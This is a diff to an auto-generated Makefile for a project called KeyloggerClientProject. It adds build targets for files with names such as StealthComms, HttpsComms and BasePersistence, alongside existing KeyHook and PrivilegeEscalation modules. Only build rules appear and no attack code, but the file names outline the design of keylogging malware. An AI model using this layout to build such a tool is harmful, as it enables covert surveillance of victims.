@@ -225,6 +225,30 @@ src/communication/HttpComms.cpp.s:
 	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/communication/HttpComms.cpp.s
 .PHONY : src/communication/HttpComms.cpp.s
 
+src/communication/HttpsComms.obj: src/communication/HttpsComms.cpp.obj
+.PHONY : src/communication/HttpsComms.obj
+
+# target to build an object file
+src/communication/HttpsComms.cpp.obj:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/communication/HttpsComms.cpp.obj
+.PHONY : src/communication/HttpsComms.cpp.obj
+
+src/communication/HttpsComms.i: src/communication/HttpsComms.cpp.i
+.PHONY : src/communication/HttpsComms.i
+
+# target to preprocess a source file
+src/communication/HttpsComms.cpp.i:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/communication/HttpsComms.cpp.i
+.PHONY : src/communication/HttpsComms.cpp.i
+
+src/communication/HttpsComms.s: src/communication/HttpsComms.cpp.s
+.PHONY : src/communication/HttpsComms.s
+
+# target to generate assembly for a file
+src/communication/HttpsComms.cpp.s:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/communication/HttpsComms.cpp.s
+.PHONY : src/communication/HttpsComms.cpp.s
+
 src/core/Application.obj: src/core/Application.cpp.obj
 .PHONY : src/core/Application.obj
 
@@ -393,6 +417,30 @@ src/data/SystemData.cpp.s:
 	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/data/SystemData.cpp.s
 .PHONY : src/data/SystemData.cpp.s
 
+src/data/Windows.obj: src/data/Windows.cpp.obj
+.PHONY : src/data/Windows.obj
+
+# target to build an object file
+src/data/Windows.cpp.obj:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/data/Windows.cpp.obj
+.PHONY : src/data/Windows.cpp.obj
+
+src/data/Windows.i: src/data/Windows.cpp.i
+.PHONY : src/data/Windows.i
+
+# target to preprocess a source file
+src/data/Windows.cpp.i:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/data/Windows.cpp.i
+.PHONY : src/data/Windows.cpp.i
+
+src/data/Windows.s: src/data/Windows.cpp.s
+.PHONY : src/data/Windows.s
+
+# target to generate assembly for a file
+src/data/Windows.cpp.s:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/data/Windows.cpp.s
+.PHONY : src/data/Windows.cpp.s
+
 src/hooks/KeyHook.obj: src/hooks/KeyHook.cpp.obj
 .PHONY : src/hooks/KeyHook.obj
 
@@ -488,6 +536,30 @@ src/main.s: src/main.cpp.s
 src/main.cpp.s:
 	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/main.cpp.s
 .PHONY : src/main.cpp.s
+
+src/persistence/BasePersistence.obj: src/persistence/BasePersistence.cpp.obj
+.PHONY : src/persistence/BasePersistence.obj
+
+# target to build an object file
+src/persistence/BasePersistence.cpp.obj:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/persistence/BasePersistence.cpp.obj
+.PHONY : src/persistence/BasePersistence.cpp.obj
+
+src/persistence/BasePersistence.i: src/persistence/BasePersistence.cpp.i
+.PHONY : src/persistence/BasePersistence.i
+
+# target to preprocess a source file
+src/persistence/BasePersistence.cpp.i:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/persistence/BasePersistence.cpp.i
+.PHONY : src/persistence/BasePersistence.cpp.i
+
+src/persistence/BasePersistence.s: src/persistence/BasePersistence.cpp.s
+.PHONY : src/persistence/BasePersistence.s
+
+# target to generate assembly for a file
+src/persistence/BasePersistence.cpp.s:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/persistence/BasePersistence.cpp.s
+.PHONY : src/persistence/BasePersistence.cpp.s
 
 src/persistence/PersistenceManager.obj: src/persistence/PersistenceManager.cpp.obj
 .PHONY : src/persistence/PersistenceManager.obj
@@ -681,6 +753,54 @@ src/security/PrivilegeEscalation.cpp.s:
 	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/security/PrivilegeEscalation.cpp.s
 .PHONY : src/security/PrivilegeEscalation.cpp.s
 
+src/security/StealthComms.obj: src/security/StealthComms.cpp.obj
+.PHONY : src/security/StealthComms.obj
+
+# target to build an object file
+src/security/StealthComms.cpp.obj:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/security/StealthComms.cpp.obj
+.PHONY : src/security/StealthComms.cpp.obj
+
+src/security/StealthComms.i: src/security/StealthComms.cpp.i
+.PHONY : src/security/StealthComms.i
+
+# target to preprocess a source file
+src/security/StealthComms.cpp.i:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/security/StealthComms.cpp.i
+.PHONY : src/security/StealthComms.cpp.i
+
+src/security/StealthComms.s: src/security/StealthComms.cpp.s
+.PHONY : src/security/StealthComms.s
+
+# target to generate assembly for a file
+src/security/StealthComms.cpp.s:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/security/StealthComms.cpp.s
+.PHONY : src/security/StealthComms.cpp.s
+
+src/utils/DataUtils.obj: src/utils/DataUtils.cpp.obj
+.PHONY : src/utils/DataUtils.obj
+
+# target to build an object file
+src/utils/DataUtils.cpp.obj:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/utils/DataUtils.cpp.obj
+.PHONY : src/utils/DataUtils.cpp.obj
+
+src/utils/DataUtils.i: src/utils/DataUtils.cpp.i
+.PHONY : src/utils/DataUtils.i
+
+# target to preprocess a source file
+src/utils/DataUtils.cpp.i:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/utils/DataUtils.cpp.i
+.PHONY : src/utils/DataUtils.cpp.i
+
+src/utils/DataUtils.s: src/utils/DataUtils.cpp.s
+.PHONY : src/utils/DataUtils.s
+
+# target to generate assembly for a file
+src/utils/DataUtils.cpp.s:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/utils/DataUtils.cpp.s
+.PHONY : src/utils/DataUtils.cpp.s
+
 src/utils/FileUtils.obj: src/utils/FileUtils.cpp.obj
 .PHONY : src/utils/FileUtils.obj
 
@@ -704,6 +824,30 @@ src/utils/FileUtils.s: src/utils/FileUtils.cpp.s
 src/utils/FileUtils.cpp.s:
 	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/utils/FileUtils.cpp.s
 .PHONY : src/utils/FileUtils.cpp.s
+
+src/utils/NetworkUtils.obj: src/utils/NetworkUtils.cpp.obj
+.PHONY : src/utils/NetworkUtils.obj
+
+# target to build an object file
+src/utils/NetworkUtils.cpp.obj:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/utils/NetworkUtils.cpp.obj
+.PHONY : src/utils/NetworkUtils.cpp.obj
+
+src/utils/NetworkUtils.i: src/utils/NetworkUtils.cpp.i
+.PHONY : src/utils/NetworkUtils.i
+
+# target to preprocess a source file
+src/utils/NetworkUtils.cpp.i:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/utils/NetworkUtils.cpp.i
+.PHONY : src/utils/NetworkUtils.cpp.i
+
+src/utils/NetworkUtils.s: src/utils/NetworkUtils.cpp.s
+.PHONY : src/utils/NetworkUtils.s
+
+# target to generate assembly for a file
+src/utils/NetworkUtils.cpp.s:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles/KeyloggerClientProject.dir/build.make CMakeFiles/KeyloggerClientProject.dir/src/utils/NetworkUtils.cpp.s
+.PHONY : src/utils/NetworkUtils.cpp.s
 
 src/utils/StringUtils.obj: src/utils/StringUtils.cpp.obj
 .PHONY : src/utils/StringUtils.obj
@@ -798,6 +942,9 @@ help:
 	@echo "... src/communication/HttpComms.obj"
 	@echo "... src/communication/HttpComms.i"
 	@echo "... src/communication/HttpComms.s"
+	@echo "... src/communication/HttpsComms.obj"
+	@echo "... src/communication/HttpsComms.i"
+	@echo "... src/communication/HttpsComms.s"
 	@echo "... src/core/Application.obj"
 	@echo "... src/core/Application.i"
 	@echo "... src/core/Application.s"
@@ -819,6 +966,9 @@ help:
 	@echo "... src/data/SystemData.obj"
 	@echo "... src/data/SystemData.i"
 	@echo "... src/data/SystemData.s"
+	@echo "... src/data/Windows.obj"
+	@echo "... src/data/Windows.i"
+	@echo "... src/data/Windows.s"
 	@echo "... src/hooks/KeyHook.obj"
 	@echo "... src/hooks/KeyHook.i"
 	@echo "... src/hooks/KeyHook.s"
@@ -831,6 +981,9 @@ help:
 	@echo "... src/main.obj"
 	@echo "... src/main.i"
 	@echo "... src/main.s"
+	@echo "... src/persistence/BasePersistence.obj"
+	@echo "... src/persistence/BasePersistence.i"
+	@echo "... src/persistence/BasePersistence.s"
 	@echo "... src/persistence/PersistenceManager.obj"
 	@echo "... src/persistence/PersistenceManager.i"
 	@echo "... src/persistence/PersistenceManager.s"
@@ -855,9 +1008,18 @@ help:
 	@echo "... src/security/PrivilegeEscalation.obj"
 	@echo "... src/security/PrivilegeEscalation.i"
 	@echo "... src/security/PrivilegeEscalation.s"
+	@echo "... src/security/StealthComms.obj"
+	@echo "... src/security/StealthComms.i"
+	@echo "... src/security/StealthComms.s"
+	@echo "... src/utils/DataUtils.obj"
+	@echo "... src/utils/DataUtils.i"
+	@echo "... src/utils/DataUtils.s"
 	@echo "... src/utils/FileUtils.obj"
 	@echo "... src/utils/FileUtils.i"
 	@echo "... src/utils/FileUtils.s"
+	@echo "... src/utils/NetworkUtils.obj"
+	@echo "... src/utils/NetworkUtils.i"
+	@echo "... src/utils/NetworkUtils.s"
 	@echo "... src/utils/StringUtils.obj"
 	@echo "... src/utils/StringUtils.i"
 	@echo "... src/utils/StringUtils.s"
